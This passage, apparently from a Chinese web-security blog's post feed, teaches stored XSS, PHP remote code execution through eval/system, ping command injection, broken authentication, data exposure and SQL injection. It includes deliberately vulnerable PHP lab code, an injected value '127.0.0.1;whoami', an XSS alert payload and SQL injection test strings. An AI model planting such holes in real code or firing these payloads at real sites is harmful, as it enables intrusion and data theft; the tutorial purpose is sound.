class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码解释：就是讲接收到的GET值，写入txt文件中，然后通过while输出txt的所以内容</p><p>最后：</p><p>我们输入的内容都会存储，显示页面上</p><p><img src="https://img1.imgtp.com/2023/09/18/SNcDXkgj.png"></p><p>最后输入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>每次打开都会弹窗，这就是xss存储型的特点</p><p><img src="https://img1.imgtp.com/2023/09/18/22ndxpsP.png"></p><h3 id="如何防御："><a href="#如何防御：" class="headerlink" title="如何防御："></a>如何防御：</h3><p>利用PHP的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">htmlentities</span>()</span><br></pre></td></tr></table></figure><p>将内容转换为<code>HTML实体</code></p><p>例如我们的<code>xss反射型</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;xss&#x27;</span>])) &#123;</span><br><span class="line">    $xss = $_GET[<span class="string">&quot;xss&quot;</span>];</span><br><span class="line">    echo <span class="string">&#x27;name:&#x27;</span>,<span class="title function_">htmlentities</span>($xss);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这样我们输出的就直接是 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>结束</p><p><img src="https://img1.imgtp.com/2023/09/18/rSt13gS9.png"></p><p>DOM型也是差不多的，这里就不演示了，真实环境当中，</p><p><code>xss漏洞</code>会加很多过滤</p><p>需要自己一步步探索</p><p>需要完整源码的可以私 ！！！</p><h2 id="RCE（远程代码执行）"><a href="#RCE（远程代码执行）" class="headerlink" title="RCE（远程代码执行）"></a>RCE（远程代码执行）</h2><h3 id="什么是远程代码执行漏洞？"><a href="#什么是远程代码执行漏洞？" class="headerlink" title="什么是远程代码执行漏洞？"></a>什么是远程代码执行漏洞？</h3><p>简单来讲就是用户直接对系统进行命令操作，危害性极高，一般来说漏洞都是出现在用户需要对系统进行执行命令的接口，在测试当中重点排查一些可疑接口，比如一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，会返回给用户返回ping的结果。</p><h3 id="简单的远程漏洞分析"><a href="#简单的远程漏洞分析" class="headerlink" title="简单的远程漏洞分析"></a>简单的远程漏洞分析</h3><p>先了解一些常见可能出现漏洞的函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br></pre></td></tr></table></figure><p>我们在代码审计的时候，重点关注以上这些函数，如果是在CTF中发现这个函数，无疑他就是存在远程代码执行漏洞。</p><p>下面我们来看看在<code>PHP</code>中一个简单的命令执行漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看到以上函数发现了有我们上面诉说的可疑函数 <code>eval()</code> 说明了着就存在了远程命令执行漏洞</p><p><strong>误区</strong>：有很多新手朋友，直接上来就输入命令，例如我是Windows ，可以发送<code>whoami</code></p><p><img src="https://img1.imgtp.com/2023/09/19/pLDDWOUh.png"></p><p>发现出错了，哪到底是哪里出错了呢？？</p><p>我们分析一下<code>eval()</code>这个函数,我们去翻PHP的语法手册</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">eval</span><span class="params">()</span></span> 函数把字符串按照 PHP 代码来计算。</span><br><span class="line"></span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾。</span><br></pre></td></tr></table></figure><p>说明 <code>eva()</code>执行的是PHP代码，并不能执行系统命令，这时候我们就需要用 <code>system()</code>这个函数来配合使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()函数</span><br><span class="line"><span class="title function_ invoke__">system</span>() 函数一样-执行shell命令也就是向dos发送一条指令</span><br></pre></td></tr></table></figure><p>就是说这个函数可以直接运行系统命令。我们将其改成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们在输入的时候：</p><p><img src="https://img1.imgtp.com/2023/09/19/zPHX4Wcq.png"></p><p>直接获取到对面的系统命令了</p><h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping_Ping_Ping"></a>Ping_Ping_Ping</h3><p>Ping 是用来测试网络是否正常，用途很广，但是在开发中也可能会给用户提供这项服务。我们用简单的代码，进行漏洞复现</p><p><strong>当然我的靶场也是有的-可以进群下载哦</strong></p><p>HTML：</p><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Ping_ping_Ping</title></head><body>    <form action="ping_ping.php" method="post">        Ip: <input type="text" name="rce">        <br>        <button>ping</button>    </form></body></html><p>PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rce</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$rce</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ohhhhhh ,no no no!!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 4 <span class="subst">$rce</span>&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p style=&#x27;color: red;&#x27;&gt;you don&#x27;t hack&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码区别就是多了这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c <span class="number">4</span> <span class="variable">$rce</span></span><br></pre></td></tr></table></figure><p>指定命令指定参数，Ping 4下</p><p>我们测试ping 一下 <code>127.0.0.1</code></p><p><img src="https://img1.imgtp.com/2023/09/19/9igxcZdu.png"></p><h4 id="windows系统命令拼接方式"><a href="#windows系统命令拼接方式" class="headerlink" title="windows系统命令拼接方式"></a>windows系统命令拼接方式</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：<span class="keyword">help</span> |more</span><br><span class="line">“&amp;” <span class="keyword">command</span>A &amp; <span class="keyword">command</span>B 先运行命令A，然后运行命令B</span><br><span class="line">“||” <span class="keyword">command</span>A || <span class="keyword">command</span>B 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” <span class="keyword">command</span>A &amp;&amp; <span class="keyword">command</span>B 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure><h4 id="Linux系统命令拼接方式"><a href="#Linux系统命令拼接方式" class="headerlink" title="Linux系统命令拼接方式"></a>Linux系统命令拼接方式</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)  ; </span><br><span class="line">分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</span><br><span class="line">(<span class="number">2</span>) <span class="string">||</span></span><br><span class="line">逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</span><br><span class="line">(<span class="number">3</span>) <span class="meta">&amp;&amp;</span></span><br><span class="line">逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 <span class="string">|| 正好相反。</span></span><br><span class="line">(<span class="number">4</span>) <span class="string">|</span></span><br><span class="line">管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</span><br></pre></td></tr></table></figure><p>基本上是没啥区别的</p><p>所以我们可以直接使用 “ ； ”来绕过等都可以绕过</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>;whoami</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/19/dLclAeeV.png"></p><p>其他命令也是一样的</p><p>基础的远程RCE就这么多，后续文章继续更新 GETSHELL提权等</p><p>未完待续…</p><h2 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a><strong>失效的身份认证</strong></h2><p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p><h3 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h3><p>1.用户身份验证凭证没有使用哈希或加密保护。<br>2.认证凭证可猜测，或者能够通过薄弱的帐户管理功能（例如账户创建、密码修改、密码恢复, 弱会话ID）重写。<br>3.会话ID暴露在URL里（例如<code>URL</code>重写）。<br>4.会话ID容易受到会话固定（<code>session fixation</code>）的攻击。<br>5.会话ID没有超时限制，或者用户会话或身份验证令牌特别是单点登录令牌在用户注销时没有失效。<br>6.成功注册后,会话ID没有轮转。<br>7.密码、会话ID和其他认证凭据使用未加密连接传输。</p><h3 id="可能产生的攻击点"><a href="#可能产生的攻击点" class="headerlink" title="可能产生的攻击点"></a>可能产生的攻击点</h3><ul><li>允许密码填充，攻击者有可能获得完整的用户名密码列表</li><li>允许暴力破解（枚举法，就是一直猜直到猜对）或【其他自动攻击】</li><li>默认的管理员用户名和密码太过简单</li><li>比较简单的忘记密码程序或者验证密码凭证</li><li>使用明文、【加密】、【弱散列】密码</li><li>缺少多因素身份验证或多因素身份验证失效</li><li>URL暴露会话ID</li><li>登录成功后不更新会话ID</li></ul><h3 id="案例？？"><a href="#案例？？" class="headerlink" title="案例？？"></a>案例？？</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xxxx.com<span class="regexp">/admin/</span>?usrid=.......</span><br></pre></td></tr></table></figure><p>例如：</p><p>将会话ID放在 url里，这种是最危险的行为，当你分享给你的小伙伴点击，则小伙伴就直接可以使用你的登入会话ID 进行身份验证，相当于免去了密码登入，可以使用你的账号进行一切行为。</p><p>这种危害相当于XSS 但是又区别于XSS ，因为XSS是直接可以读取你的COOKIE 进行直接登入。</p><p><strong>危害:</strong></p><p>这些漏洞可能导致部分甚至全部账户遭受攻击，一旦攻击成功，攻击者就能执行合法的任何操作</p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul><li>少用默认配置。特别是管理员用户，默认配置会带来很多敏感信息的泄露；</li><li>多因素身份验证，比如追加手机号验证等，这样可以防止自动填充带来的登录；</li><li>定期执行弱密码检查。</li><li>使用更加复杂的密码策略。</li><li>限制多次登录失败的会话，登录失败后使用统一的回复</li><li>登录成功后随机生成新ID，且不能显示在URL中，绝对超时后失效。</li></ul><h2 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a><strong>敏感数据泄露</strong></h2><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、License、隐私数据(如短消息的内容)、授权凭据、个人数据(如姓名、住址、电话等)等。在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。主要分为由版本管理软件导致的泄露, 文件包含导致的泄露和配置错误导致的泄露。</p><p>例如：某高校在上传学生资料的时候，没注意上传的安全性，直接被谷歌浏览器等 搜索到关键信息</p><p><img src="https://img1.imgtp.com/2023/09/19/6JPdaxVR.png"></p><p>这些信息我们可以通关弱口令猜，可以登入学生的管理账号，进一步的进行测试</p><h3 id="操作系统的版本信息"><a href="#操作系统的版本信息" class="headerlink" title="操作系统的版本信息"></a>操作系统的版本信息</h3><p>可以使用Nmap来扫描获取。（查看你的操作系统版本-例如win7 MS7_010）</p><h3 id="中间件的版本信息"><a href="#中间件的版本信息" class="headerlink" title="中间件的版本信息"></a>中间件的版本信息</h3><ul><li>404界面，显示中间件版本号（暴露可能存在nday）</li><li>kali信息收集工具：<code>webwhat</code>（返回中间件的版本）</li></ul><h3 id="Web敏感信息"><a href="#Web敏感信息" class="headerlink" title="Web敏感信息"></a>Web敏感信息</h3><ul><li><p>后台目录：弱口令，万能密码，爆破</p></li><li><p>安装包：获取数据库信息，甚至是网站源码</p></li><li><p>上传目录：截断、上传图片马等</p></li><li><p>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</p></li><li><p>安装页面 ：可以二次安装进而绕过（setup）</p></li><li><p>phpinfo：配置的各种信息暴露出来</p></li><li><p>编辑器：fck、ke、等</p></li><li><p>iis短文件利用：条件比较苛刻  windows、apache等</p></li></ul><h3 id="网络信息泄露"><a href="#网络信息泄露" class="headerlink" title="网络信息泄露"></a>网络信息泄露</h3><p>DNS域传送漏洞运维监控系统弱口令、网络拓扑泄露、zabbix弱口令、zabbix sql注入等</p><h3 id="第三方软件应用"><a href="#第三方软件应用" class="headerlink" title="第三方软件应用"></a>第三方软件应用</h3><p>github上源码、数据库、邮箱密码泄露</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li>扫描内网开放服务</li><li>向内部任意主机的任意端口发送payload来攻击内网服务</li><li><code>DOS攻击</code>（请求大文件，始终保持连接Keep-Alive Always）</li><li>攻击内网的web应用，例如直接<code>SQL注入</code>、<code>XSS攻击</code>等</li><li>利用<code>file、gopher、dict</code>协议读取本地文件、执行命令等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 常见漏洞 </category>
          
          <category> OWASP_TOP_10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 常见漏洞 </tag>
            
            <tag> OWASP </tag>
            
            <tag> 知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入源代码,测试与分析第一节</title>
      <link href="/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/"/>
      <url>/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><code>SQL注入</code>攻击是目前web应用网络攻击中最常见的手段之一，曾被冠以 “<strong>漏洞之王</strong>” 的称号，其安全风险高于缓冲区溢出漏洞等所有其他漏洞，而市场上的防火墙又不能对<code>SQL注入</code>漏洞进行有效的检测和防范。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li><code>SQL注入</code>攻击普遍存在<strong>范围广</strong>、<strong>实现容易</strong>、<strong>破坏性大</strong>等特点。</li></ul><h2 id="具备知识点"><a href="#具备知识点" class="headerlink" title="具备知识点:"></a>具备知识点:</h2><p><strong>结构化查询语言</strong>（Structured Query Language）简称 <strong>SQL</strong>，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p><p><strong>SQL注入</strong>即是指<strong>web</strong>应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中<strong>事先定义好的查询语句的结尾</strong>后，<strong>添加额外的SQL语句</strong>，在管理员不知情的情况下实现<strong>非法操作</strong>，以此来实现欺骗数据库服务器执行<strong>非授权的任意查询</strong>，从而进一步得到相应的数据信息。</p><h2 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h2><p><strong>Kali linux、php语言环境 、vscode</strong></p><h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p><img src="https://img1.imgtp.com/2023/09/14/f2jZbggX.jpg"></p><h2 id="一、简单的sql复现"><a href="#一、简单的sql复现" class="headerlink" title="一、简单的sql复现"></a>一、简单的sql复现</h2><p>测试PHP环境，是否可以使用，不会搭建PHP环境的网上自行搜索</p><p><img src="https://img1.imgtp.com/2023/09/14/5meNyky0.png"></p><p>看到下面这个画面说明PHP环境没问题</p><p><img src="https://img1.imgtp.com/2023/09/14/AwN91RhW.png"></p><h2 id="二、数据库环境"><a href="#二、数据库环境" class="headerlink" title="二、数据库环境"></a>二、数据库环境</h2><p>随便建立一个表，还不会数据库的可以参考我以前的文章</p><p><img src="https://img1.imgtp.com/2023/09/16/MTfNfSCm.png"></p><p>例如我自己随便建立的表</p><p>测试一下数据库是否连接成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">// 数据库主机名</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;password&#x27;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$database</span> = <span class="string">&#x27;mydb&#x27;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建PDO对象</span></span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=<span class="subst">$database</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置错误模式为异常</span></span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接成功，可以执行数据库操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// 连接异常处理</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="简单的sql注入源代码分析"><a href="#简单的sql注入源代码分析" class="headerlink" title="简单的sql注入源代码分析"></a>简单的sql注入源代码分析</h1><p>直接上代码：</p><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>什么SQL注入</title></head><body>    <form action="index.php" method="get">        <input type="text" name="id">        <button>查询</button>    </form></body></html><?php$servername = "127.0.0.1";$username = "root";$password = "123456";$dbname = "uses";$conn = new mysqli($servername, $username, $password, $dbname);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT id, name, address FROM username WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 输出数据</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;姓名: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;地址: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;address&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/16/kXi7JvyC.png"></p><p><img src="https://img1.imgtp.com/2023/09/16/Vn9nN7tk.png"></p><p>测试成功！</p><h1 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>test.com/index.php?id=<span class="number">2</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>发现该网站有报错</p><p><img src="https://img1.imgtp.com/2023/09/16/h6IGHmqc.png"></p><table><thead><tr><th>测试字符</th><th>变种</th><th>返回</th></tr></thead><tbody><tr><td>‘</td><td>N&#x2F; A</td><td>触发数据库返回错误</td></tr><tr><td>‘ OR ‘1’ &#x3D; ‘1</td><td>‘) OR (‘1’ &#x3D; ‘1</td><td>真，返回所有行</td></tr><tr><td>value’ OR ‘1’ &#x3D; ‘2</td><td>value’) OR (‘1’ &#x3D; ‘2</td><td>空，不影响返回结果</td></tr><tr><td>value’ OR ‘1’ &#x3D; ‘2</td><td>‘) AND (‘1’ &#x3D; ‘2</td><td>假，返回空。</td></tr><tr><td>‘ OR ‘ab’ &#x3D; ‘a’’b</td><td>‘) OR (‘ab’ &#x3D; ‘a’’b</td><td>字符串连接，结果同永真</td></tr></tbody></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单阐述sql注入的源码与分析，具体操作后续会继续更新！！</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 源代码分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库速通笔记2</title>
      <link href="/2023/09/16/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E9%80%9A%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/09/16/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E9%80%9A%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL数据库速通笔记"><a href="#MySQL数据库速通笔记" class="headerlink" title="MySQL数据库速通笔记"></a>MySQL数据库速通笔记</h1><p>为了网安的方便学习，通过三篇文章迅速了解数据库。</p><h2 id="Mysql数据库常用命令"><a href="#Mysql数据库常用命令" class="headerlink" title="Mysql数据库常用命令"></a>Mysql数据库常用命令</h2><h3 id="1-1-增删改查"><a href="#1-1-增删改查" class="headerlink" title="1.1 增删改查"></a>1.1 增删改查</h3><ol><li><p>插入数据：使用<code>INSERT INTO</code>语句向表中插入数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...);</span><br></pre></td></tr></table></figure></li><li><p>更新数据：使用<code>UPDATE</code>语句更新表中的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;</span><br></pre></td></tr></table></figure></li><li><p>扩展表结构（增加字段）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD remark varchar(50) default 